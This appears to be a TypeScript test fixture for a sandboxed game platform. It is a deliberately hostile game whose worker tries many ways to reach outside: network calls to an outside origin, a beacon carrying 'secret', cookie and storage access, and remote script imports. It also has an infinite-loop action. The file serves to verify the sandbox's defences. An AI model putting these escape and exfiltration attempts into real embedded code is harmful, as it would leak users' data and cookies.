/**
 * A hostile Game: from inside the frame's worker, it tries every way out the plan lists, and shows
 * what happened to each in its Screen View. The last thing it does, on the "loop" Action, is loop
 * forever.
 *
 * The attempts start in `start`, because only then does it know this run's token (the first
 * Player's id), which it puts in every URL so the servers' counts can be matched to this run.
 * Each attempt's line says what happened: "blocked" with the error, "missing" when the API doesn't
 * exist in a worker, or "REACHED" if anything got through.
 */
import { defineGame } from "../../sdk/src/v1/index.js";
import { FRAME, OUTSIDE, SITE } from "../origins.js";

/** A worker's global scope, loosely: this file is type-checked as a page, and probes what exists. */
const scope = globalThis as unknown as Record<string, unknown> & {
  addEventListener(type: string, listener: (event: { violatedDirective?: string; blockedURI?: string }) => void): void;
};

const report: Record<string, string> = {};
const violations: string[] = [];
let started = false;

// The CSP's own record of what it blocked: the clearest evidence of which wall stopped what.
scope.addEventListener("securitypolicyviolation", (event) => violations.push(`${event.violatedDirective} ${event.blockedURI}`));

const describe = (error: unknown): string => (error instanceof Error ? `${error.name}: ${error.message}` : String(error));

/** Runs one attempt and records its outcome; gives up after 4 seconds. */
function attempt(name: string, run: () => Promise<string> | string): void {
  report[name] = "pending";
  const give = (text: string) => {
    if (report[name] === "pending") report[name] = text;
  };
  setTimeout(() => give("no answer within 4 s"), 4_000);
  try {
    Promise.resolve(run()).then(give, (error: unknown) => give(`blocked: ${describe(error)}`));
  } catch (error) {
    give(`blocked: ${describe(error)}`);
  }
}

/** Promise for an event-driven attempt: `REACHED` on its success event, `blocked` on its error event. */
function events(target: { addEventListener(type: string, listener: (event: unknown) => void): void }, ok: string, failed: string[]): Promise<string> {
  return new Promise((resolve) => {
    target.addEventListener(ok, () => resolve(`REACHED (${ok})`));
    for (const type of failed) target.addEventListener(type, () => resolve(`blocked (${type} event)`));
  });
}

function missing(name: string): string | undefined {
  return typeof scope[name] === "undefined" ? `missing: no ${name} in a worker` : undefined;
}

type Ctor = new (...args: unknown[]) => { addEventListener(type: string, listener: (event: unknown) => void): void } & Record<string, unknown>;

function tryEverything(token: string): void {
  const probe = (origin: string, what: string) => `${origin}/probe/${token}/${what}`;

  attempt("fetch the site", async () => `REACHED: ${(await fetch(probe(SITE, "fetch"), { mode: "no-cors", credentials: "include" })).type}`);
  attempt("fetch outside", async () => `REACHED: ${(await fetch(probe(OUTSIDE, "fetch"), { mode: "no-cors" })).type}`);
  for (const [name, origin] of [["XMLHttpRequest the site", SITE], ["XMLHttpRequest outside", OUTSIDE]] as const) {
    attempt(name, () => {
      const xhr = new XMLHttpRequest();
      const done = events(xhr, "load", ["error", "abort"]);
      xhr.open("GET", probe(origin, "xhr"));
      xhr.send();
      return done;
    });
  }
  attempt("WebSocket", () => {
    const why = missing("WebSocket");
    if (why !== undefined) return why;
    const socket = new (scope["WebSocket"] as Ctor)(`${probe(OUTSIDE, "ws").replace("http:", "ws:")}`);
    return events(socket, "open", ["error"]);
  });
  attempt("EventSource", () => missing("EventSource") ?? events(new (scope["EventSource"] as Ctor)(probe(OUTSIDE, "sse")), "message", ["error"]));
  attempt("importScripts", () => {
    const load = scope["importScripts"] as ((url: string) => void) | undefined;
    if (load === undefined) return "missing: no importScripts";
    load(probe(OUTSIDE, "import.js"));
    return "REACHED: importScripts returned";
  });
  // The frame's own origin: a script from there was once allowed ('self'), and reached its server.
  const own = (what: string) => `${FRAME}/v1/?${token}-${what}`;
  const ownMissing = (what: string) => `${FRAME}/v1/${token}-${what}.js`;
  const ownQuery = (what: string) => `${FRAME}/v1/index.html?probe=${token}-${what}`;
  for (const [name, url] of [
    ["importScripts the frame's page", own("is")],
    ["importScripts a missing frame file", ownMissing("is404")],
    ["importScripts the frame with a query", ownQuery("isq")],
  ] as const) {
    attempt(name, () => {
      (scope["importScripts"] as (url: string) => void)(url);
      return "REACHED: importScripts returned";
    });
  }
  for (const [name, url] of [
    ["import() the frame's page", own("dyn")],
    ["import() a missing frame file", ownMissing("dyn404")],
    ["import() the frame with a query", ownQuery("dynq")],
  ] as const) {
    // The URL is a variable, so the bundler leaves this import() for the browser to run.
    attempt(name, async () => {
      await import(/* @vite-ignore */ url);
      return "REACHED: import() resolved";
    });
  }
  attempt("fetch the frame", async () => `REACHED: ${(await fetch(own("fetch"), { mode: "no-cors" })).type}`);
  attempt("XMLHttpRequest the frame", () => {
    const xhr = new XMLHttpRequest();
    const done = events(xhr, "load", ["error", "abort"]);
    xhr.open("GET", own("xhr"));
    xhr.send();
    return done;
  });
  attempt("WebSocket the frame", () => events(new (scope["WebSocket"] as Ctor)(own("ws").replace("http:", "ws:")), "open", ["error"]));
  attempt("EventSource the frame", () => events(new (scope["EventSource"] as Ctor)(own("sse")), "message", ["error"]));
  for (const [name, url] of [
    ["FontFace from the frame", own("font")],
    ["FontFace from outside", probe(OUTSIDE, "font")],
  ] as const) {
    attempt(name, async () => {
      const Face = scope["FontFace"] as (new (family: string, source: string) => { load(): Promise<unknown> }) | undefined;
      if (Face === undefined) return "missing: no FontFace in a worker";
      await new Face("stolen", `url(${url})`).load();
      return "REACHED: a font loaded";
    });
  }
  attempt("WebTransport", async () => {
    const why = missing("WebTransport");
    if (why !== undefined) return why;
    // No server here speaks HTTP/3, so only the CSP's violation report can show which wall stopped it.
    const transport = new (scope["WebTransport"] as Ctor)(probe(OUTSIDE, "wt").replace("http:", "https:"));
    await transport["ready"];
    return "REACHED: a WebTransport session opened";
  });
  attempt("navigator.sendBeacon", () => {
    const send = (scope["navigator"] as { sendBeacon?: (url: string, data: string) => boolean }).sendBeacon;
    if (send === undefined) return "missing: no navigator.sendBeacon in a worker";
    return send.call(scope["navigator"], probe(OUTSIDE, "beacon"), "secret") ? "REACHED? sendBeacon returned true" : "blocked: sendBeacon returned false";
  });
  attempt("RTCPeerConnection", () => {
    const why = missing("RTCPeerConnection");
    if (why !== undefined) return why;
    const peer = new (scope["RTCPeerConnection"] as Ctor)({ iceServers: [{ urls: `stun:127.0.0.1:4102` }] });
    return `REACHED: made a peer connection (${String(peer["connectionState"])})`;
  });
  attempt("indexedDB", () => {
    const why = missing("indexedDB");
    if (why !== undefined) return why;
    const request = (scope["indexedDB"] as { open(name: string): Ctor["prototype"] }).open("stolen");
    return events(request, "success", ["error", "blocked"]);
  });
  attempt("caches", async () => {
    const why = missing("caches");
    if (why !== undefined) return why;
    await (scope["caches"] as { open(name: string): Promise<unknown> }).open("stolen");
    return "REACHED: opened a cache";
  });
  attempt("cookies", async () => {
    if (typeof scope["document"] !== "undefined") return "REACHED: a document exists";
    const store = scope["cookieStore"] as { getAll(): Promise<unknown[]> } | undefined;
    if (store === undefined) return "missing: no document.cookie or cookieStore in a worker";
    return `REACHED: cookieStore gave ${(await store.getAll()).length} cookies`;
  });
}

type State = { readonly checks: number };
type Action = { readonly type: "report" } | { readonly type: "loop" };

export default defineGame<State, Action>({
  about: { title: "Hostile", players: { min: 1, max: 4 } },
  start(ctx) {
    if (!started) {
      started = true;
      tryEverything(ctx.players[0]?.id ?? "no-token");
    }
    return { state: { checks: 0 } };
  },
  onAction(state, _player, action) {
    if (action.type === "loop") for (;;);
    return { state: { checks: state.checks + 1 } };
  },
  onLeave: (state) => ({ state }),
  screen: () => ({
    parts: [
      ...Object.entries(report).map(([name, outcome]) => ({ kind: "text" as const, text: `${name} => ${outcome}`.slice(0, 2_000) })),
      { kind: "text" as const, text: `violations => ${JSON.stringify(violations)}`.slice(0, 2_000) },
    ],
  }),
  controller: () => ({
    parts: [
      { kind: "button", label: "Report", action: { type: "report" } },
      { kind: "button", label: "Loop", action: { type: "loop" } },
    ],
  }),
});
